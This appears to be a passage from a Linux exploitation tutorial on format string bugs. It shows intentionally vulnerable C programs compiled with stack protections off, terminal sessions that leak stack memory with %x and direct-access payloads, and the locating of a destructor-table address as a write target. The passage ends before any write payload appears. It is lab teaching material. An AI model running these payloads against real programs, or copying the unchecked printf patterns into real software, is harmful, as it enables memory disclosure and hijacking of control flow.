#### 2. Format String Exploitation

Format String | Output | Usage
--------------|--------|----------%d | Decimal (int) | Output decimal number%s | String | Reads string from memory%x | Hexadecimal | Output Hexadecimal Number%n | Number of bytes written so far | Writes the number of bytes till the format string to memory 
###### Vulnerable format string functions

- printf
- vsprintf
- fprintf
- vsnprintf
- sprint 
- vfprintf 
- snprintf 
- vprintf

###### Vulnerable program

```c
u32@u32-VirtualBox:~/linux-exp$ cat format-vuln.c
#include <stdio.h>

int main(int argc, char *argv[])

{
	char* i = argv[1];
	printf("You wrote: %s\n", i);
}
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gcc format-vuln.c -o format-vuln -ggdb -z execstack -fno-stack-protector
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln
You wrote: (null)
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln kan1shka9
You wrote: kan1shka9
u32@u32-VirtualBox:~/linux-exp$
```

```c
u32@u32-VirtualBox:~/linux-exp$ cat format-vuln-2.c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char test[1024];
	strcpy(test,argv[1]);
	printf("You wrote:");
	printf(test);
	printf("\n");
}
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gcc format-vuln-2.c -o format-vuln-2 -ggdb -z execstack -fno-stack-protector
format-vuln-2.c: In function ‘main’:
format-vuln-2.c:9:9: warning: format not a string literal and no format arguments [-Wformat-security]
  printf(test);
         ^~~~
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln-2 kan1shka9
You wrote:kan1shka9
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln-2 %x
You wrote:bfe74805
u32@u32-VirtualBox:~/linux-exp$
```

```c
u32@u32-VirtualBox:~/linux-exp$ cat format-vuln-3.c
#include <stdio.h>
#include <stdlib.h>

int main (int argc, char *argv[])
{

	char buf[512];
	if (argc < 2)
	{
		printf("%s\n","Failed");
		return 1;
	}
	snprintf(buf, sizeof(buf), argv[1]);
	buf[sizeof (buf) - 1] = '\x00';
	return 0;
}
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ gcc format-vuln-3.c -o format-vuln-3 -ggdb -z execstack -fno-stack-protector
format-vuln-3.c: In function ‘main’:
format-vuln-3.c:13:2: warning: format not a string literal and no format arguments [-Wformat-security]
  snprintf(buf, sizeof(buf), argv[1]);
  ^~~~~~~~
u32@u32-VirtualBox:~/linux-exp$
```

###### Analysis

```sh
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln-2 $(python -c 'print "%08x-"*20')
You wrote:bfecd7a3-00000048-00000004-78383025-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-
u32@u32-VirtualBox:~/linux-exp$
```

```sh
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln-2 AAAA$(python -c 'print "%08x-"*20')
You wrote:AAAAbfc0c79f-00000048-00000004-41414141-78383025-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-30252d78-252d7838-2d783830-78383025-
u32@u32-VirtualBox:~/linux-exp$
```

- Format String Direct Access

```sh
u32@u32-VirtualBox:~/linux-exp$ ./format-vuln-2 'AAAA-%4$x'
You wrote:AAAA-41414141
u32@u32-VirtualBox:~/linux-exp$
```

- ```ltrace``` to trace the library calls 

```sh
u32@u32-VirtualBox:~/linux-exp$ ltrace ./format-vuln-3 AAAA%x%x%x%x%x%x%x%x
__libc_start_main(0x804843b, 2, 0xbff70e64, 0x80484a0 <unfinished ...>
snprintf("AAAAb77caff041414141633737623066"..., 512, "AAAA%x%x%x%x%x%x%x%x", 0xb77caff0, 0x41414141, 0x63373762, 0x30666661, 0x31343134, 0x31343134, 0x37333336, 0x32363733) = 68
+++ exited (status 0) +++
u32@u32-VirtualBox:~/linux-exp$
```

- Get the [```Destructors```](http://en.cppreference.com/w/cpp/language/destructor) end address since most c programs will call destructors after main is executed

```sh
u32@u32-VirtualBox:~/linux-exp$ nm ./format-vuln-3 | grep dtor
080483f0 t __do_global_dtors_aux
08049f0c t __do_global_dtors_aux_fini_array_entry
u32@u32-VirtualBox:~/linux-exp$
```

08049f0c

\x0c\x9f\x04\x08